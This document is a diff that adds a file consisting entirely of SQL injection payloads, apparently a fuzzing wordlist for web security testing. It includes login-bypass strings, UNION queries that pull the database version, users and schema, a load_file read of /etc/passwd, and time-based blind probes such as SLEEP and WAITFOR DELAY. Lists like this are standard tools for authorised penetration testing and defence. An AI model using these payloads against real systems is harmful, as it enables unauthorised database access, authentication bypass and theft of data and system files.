@@ -1,0 +1,75 @@
+'
+"
+')
+")
+'))
+"))
+'
+''
+"
+""
+`
+\
+%27
+%22
+%60
+%5C
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1' --
+" OR "1"="1" --
+' OR '1'='1' #
+" OR "1"="1" #
+' OR '1'='1' /*
+" OR "1"="1" /*
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+" OR 1=1#
+' OR 1=1/*
+" OR 1=1/*
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or 1=1--
+') or 1=1#
+') or 1=1/*
+') or ('1'='1
+') or ('1'='1'--
+') or ('1'='1'#
+') or ('1'='1'/*
+' AND 1=1--
+' AND 1=2--
+' AND '1'='1
+' AND '1'='2
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION SELECT @@version--
+' UNION SELECT user()--
+' UNION SELECT database()--
+' UNION SELECT @@hostname--
+' UNION SELECT load_file('/etc/passwd')--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 10--
+' ORDER BY 100--
+' GROUP BY 1--
+' GROUP BY columnnames--
+' HAVING 1=1--
+' OR SLEEP(5)--
+' OR pg_sleep(5)--
+' WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'--
+' AND SLEEP(5)--
+' AND pg_sleep(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT COUNT(*) FROM information_schema.tables)--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
